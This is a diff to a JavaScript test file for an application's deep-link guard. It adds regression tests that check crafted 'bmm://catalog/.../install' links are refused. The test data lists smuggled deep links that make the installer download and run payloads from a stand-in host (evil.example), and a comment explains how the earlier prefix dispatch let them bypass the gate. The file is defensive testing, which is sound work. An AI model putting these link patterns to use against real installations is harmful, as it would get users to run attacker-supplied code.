@@ -16,7 +16,7 @@ import { join, dirname } from 'node:path';
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
 const G = await import(pathToFileURL(join(ROOT, 'frontend/js/core/deeplink-guard.js')).href);
-const { admitLink, decideLink, linkPathRefusal, linkHttpsRefusal, PROMPT_FREE } = G;
+const { admitLink, decideLink, linkPathRefusal, linkHttpsRefusal, PROMPT_FREE, catalogRoute } = G;
 
 const SHA = 'a'.repeat(64);
 
@@ -203,6 +203,55 @@ describe('every route has a decision', () => {
                 `${action} changes nothing? Either it asks (deeplink-guard.ts decideLink) or it is listed, with its reason, in PROMPT_FREE`);
         });
     }
+});
+
+// The gate matches an action WHOLE; the handler used to dispatch the two catalogue families
+// on a prefix and a suffix. `bmm://catalog/app/x/install` therefore reached the app installer
+// — which downloads the payload and RUNS it (`install_app` launches every `.msi` and anything
+// whose filename says setup/install) — while the gate had shown no dialog and applied no hard
+// limit, because it had never heard of that action. One parser now answers for both.
+describe('a catalogue action the gate does not know is refused, not passed on', () => {
+    const SMUGGLED = [
+        `bmm://catalog/app/x/install?name=Foo&type=msi&url=https://evil.example/p.msi&sha256=${SHA}`,
+        `bmm://catalog/app/x/y/install?name=Foo&url=https://evil.example/setup.exe&sha256=${SHA}`,
+        'bmm://catalog/plugin/x/install?url=https://evil.example/p.zip',
+        'bmm://catalog/theme/x/install?url=http://evil.example/t.json',
+        'bmm://catalog/app/x/add-source?url=http://evil.example/c.json',
+        'bmm://catalog/mod/install?url=https://evil.example/p.zip',
+    ];
+    for (const url of SMUGGLED) {
+        test(url, async () => {
+            const r = await run(url, 'external', true);
+            assert.equal(r.out, null, 'admitted an action no rule decided on');
+            assert.equal(r.asked.length, 0, 'a hard limit must not even ask');
+            assert.equal(r.refused[0]?.reason, 'unknown-action');
+        });
+    }
+
+    test('the real catalogue routes still work exactly as before', async () => {
+        const ok = await run(`bmm://catalog/app/install?name=OBS&url=https://example.com/obs.zip&type=zip&sha256=${SHA}`, 'external', true);
+        assert.ok(ok.out, 'catalog/app/install must still be admitted after the answer');
+        assert.equal(ok.asked.length, 1);
+        // add-source carries its own dialog in the handler, so the gate lets it through.
+        const src = await run('bmm://catalog/theme/add-source?url=https://example.com/c.json', 'external', true);
+        assert.ok(src.out);
+        for (const a of ['catalog/follow', 'catalog/entry', 'catalog/delete', 'catalog/publish']) {
+            assert.equal(catalogRoute(a), null, `${a} is two segments and must not parse as a kind route`);
+        }
+    });
+
+    test('one parser, so the gate and the handler cannot read a link differently', () => {
+        assert.deepEqual(catalogRoute('catalog/app/install'), { kind: 'app', verb: 'install' });
+        assert.deepEqual(catalogRoute('catalog/plugin/add-source'), { kind: 'plugin', verb: 'add-source' });
+        for (const a of ['catalog/app/x/install', 'catalog/mod/install', 'catalog//install', 'catalog/App/install']) {
+            assert.equal(catalogRoute(a), null, a);
+        }
+        // The handler must dispatch on that parser, not on a prefix of the action.
+        const src = readFileSync(process.env.DLM_SRC || join(ROOT, 'frontend/src/core/deep_link_manager.ts'), 'utf8');
+        assert.doesNotMatch(src, /action\.startsWith\('catalog\//,
+            'the handler dispatches a catalogue route on a prefix the gate never matched');
+        assert.match(src, /catalogRoute\(action\)/);
+    });
 });
 
 describe('path and URL predicates (mirrors commands/link_guard.rs)', () => {
